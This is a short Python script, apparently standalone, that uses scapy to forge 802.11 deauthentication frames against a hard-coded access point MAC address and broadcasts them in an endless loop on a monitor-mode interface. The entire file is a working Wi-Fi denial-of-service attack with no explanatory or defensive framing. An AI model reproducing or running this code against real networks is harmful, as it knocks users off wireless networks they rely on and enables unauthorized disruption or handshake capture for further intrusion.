from scapy.all import *

ap = "e8:cc:18:a0:58:e5"

clients = "FF:FF:FF:FF:FF:FF"
client = "aa:aa:aa:aa:aa:aa"

pkt = RadioTap()/Dot11(addr1 =ap, addr2=clients, addr3=clients)/Dot11Deauth()
pkt1 = RadioTap()/Dot11(addr1 =ap, addr2=client, addr3=client)/Dot11Deauth()
while 1:
    sendp(pkt, iface="wlan0mon")
    sendp(pkt1, iface="wlan0mon")